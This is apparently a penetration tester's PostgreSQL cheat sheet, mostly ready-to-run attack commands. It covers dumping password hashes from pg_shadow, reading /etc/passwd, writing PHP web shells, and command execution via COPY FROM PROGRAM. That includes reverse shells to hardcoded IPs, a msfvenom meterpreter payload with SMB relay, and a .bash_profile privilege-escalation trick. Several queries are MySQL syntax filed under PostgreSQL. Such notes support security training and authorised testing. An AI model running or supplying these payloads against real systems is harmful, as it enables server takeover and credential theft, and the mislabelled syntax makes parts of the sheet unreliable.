# Postgresql

### Basic commands&#x20;

{% code overflow="wrap" %}
```bash
# Access to postgresql database
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection

psql -h 192.168.80.47 -p 5437 -U postgres -W 

# List the database
> \list
# Connect to the database
> \c <database name>
# List the tables
> \d
# Get user role
> \du+ 

# Enumerate the version number
> SELECT version(); 

# Read credentials
SELECT usename, passwd from pg_shadow;

# Dump a file
SELECT * FROM mytable INTO dumpfile '/tmp/somefile'

# Dump a PHP shell
SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php' 

# Dump a PHP shell (2)
SELECT "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php' 

# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;

# Read file 
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE(0x633A5C626F6F742E696E69) 
SELECT load_file("/etc/passwd") from information_schema
```
{% endcode %}

### Create a user

```bash
# Create a user
CREATE USER 'netspi'@'%' IDENTIFIED BY 'password'

# Drop a user
DROP USER netspi
```

### RCE

{% code overflow="wrap" %}
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

# PGP - Peppo box
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'uname -a'; SELECT * FROM cmd_exec; DROP TABLE IF EXISTS cmd_exec;

# HTB - Jupitar 
DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.66/4444 0>&1\"';SELECT * FROM cmd_exec;DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% endcode %}

### SMB Relay

{% code overflow="wrap" %}
```bash
## Create a revere shell 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR.IP.GOES.HERE LPORT=443 -f exe > reverse_shell.exe

# Set up a SMB relay
smbrelayx.py -h <victim IP> -e ./reverse_shell.exe

# Execute any one of the SQL commands below
select load_file('\\\\<kali ip>\\aa');
select load_file(0x5c5c5c5c3139322e3136382e302e3130315c5c6161);
select 'netspi' into dumpfile '\\\\<kali ip>\\aa';
select 'netspi' into outfile '\\\\<kali ip>\\aa';
load data infile '\\\\<kali ip>\\aa' into table database.table_name;
```
{% endcode %}

### Privilege Escalation

{% code overflow="wrap" %}
```bash
# Assume that the root process is calling 'su -p postgresql' constantly via cron. 
# You place your privilege escalation binary to .bash_profile in the login directory.

> COPY (SELECT CAST('/tmp/privesc/privesc.binary' AS text)) TO '/var/lib/postgresql/.bash_profile'; 

# Grab a source code and compile with gcc -o privesc.binary file.c -static
https://www.errno.fr/TTYPushback.html
```
{% endcode %}



For more commands, check out the following site.&#x20;

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)

[https://sqlwiki.netspi.com/attackQueries/informationGathering/#postgresql](https://sqlwiki.netspi.com/attackQueries/informationGathering/#postgresql)
